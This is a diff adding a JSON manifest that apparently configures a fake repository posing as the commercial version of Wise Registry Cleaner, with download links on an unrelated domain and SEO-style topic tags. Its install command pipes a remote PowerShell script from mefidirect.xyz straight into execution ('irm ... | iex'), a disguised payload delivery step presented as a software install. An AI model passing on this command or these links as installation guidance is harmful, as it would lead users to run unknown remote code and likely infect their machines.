@@ -1,0 +1,26 @@
+{
+  "repo": "wise-registry-cleaner-commercial-version",
+  "product": "Wise Registry Cleaner Commercial Version",
+  "kind": "utility",
+  "install_type": "download",
+  "download_url": "https://wise-cleaner.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "utility",
+  "topics": [
+    "wise-cleaner-support",
+    "wise-cleaner-workspace",
+    "wise-cleaner-pc-edition",
+    "install-guide",
+    "user-manual",
+    "getting-started",
+    "disk-cleaner",
+    "wise-cleaner-getting-started",
+    "wise-cleaner-local-install",
+    "file-manager",
+    "windows-11",
+    "iso-tools"
+  ]
+}
